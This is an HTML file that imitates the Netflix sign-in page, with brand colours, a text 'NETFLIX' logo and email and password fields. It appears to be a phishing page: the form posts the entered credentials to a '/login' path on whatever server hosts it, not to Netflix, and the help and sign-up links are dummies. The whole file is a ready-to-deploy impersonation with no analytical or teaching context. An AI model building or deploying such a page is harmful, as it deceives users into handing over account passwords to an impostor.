<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Netflix - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #141414;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            padding: 20px;
        }
        .container {
            background: rgba(0,0,0,0.75);
            padding: 40px 32px 32px;
            border-radius: 8px;
            width: 100%;
            max-width: 400px;
        }
        .logo {
            margin-bottom: 30px;
        }
        .logo svg {
            width: 160px;
            height: auto;
        }
        h1 {
            font-size: 28px;
            font-weight: 500;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: background 0.3s;
            -webkit-appearance: none;
        }
        .form-group input:focus {
            background: #454545;
        }
        .form-group input::placeholder {
            color: #8c8c8c;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #e50914;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s, opacity 0.2s;
            margin-top: 10px;
            touch-action: manipulation;
        }
        .login-btn:active {
            opacity: 0.8;
        }
        .login-btn:hover {
            background: #f40612;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 16px;
            font-size: 14px;
            color: #8c8c8c;
        }
        .links a {
            color: #8c8c8c;
            text-decoration: none;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .checkbox-group {
            display: flex;
            align-items: center;
            margin-top: 12px;
            font-size: 14px;
            color: #8c8c8c;
        }
        .checkbox-group input {
            margin-right: 8px;
        }
        .signup {
            text-align: center;
            margin-top: 20px;
            font-size: 16px;
            color: #8c8c8c;
        }
        .signup a {
            color: #fff;
            text-decoration: none;
            font-weight: 600;
        }
        .signup a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container { padding: 25px 20px; }
            h1 { font-size: 24px; }
            .logo svg { width: 130px; }
            .login-btn { padding: 14px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 160 40"><text x="0" y="30" font-family="Arial, sans-serif" font-size="32" font-weight="700" fill="#e50914">NETFLIX</text></svg>
        </div>
        <h1>Sign In</h1>
        <form id="loginForm" method="POST" action="/login" autocomplete="off">
            <div class="form-group">
                <input type="text" name="username" placeholder="Email or phone number" required autocomplete="email">
            </div>
            <div class="form-group">
                <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            </div>
            <button type="submit" class="login-btn">Sign In</button>
            <div class="checkbox-group">
                <input type="checkbox" id="remember" checked>
                <label for="remember">Remember me</label>
            </div>
            <div class="links">
                <a href="#">Need help?</a>
            </div>
        </form>
        <div class="signup">
            New to Netflix? <a href="#">Sign up now</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = this.querySelector('.login-btn');
            btn.textContent = 'Signing in...';
            btn.disabled = true;
            btn.style.opacity = '0.7';
        });
    </script>
</body>
</html>
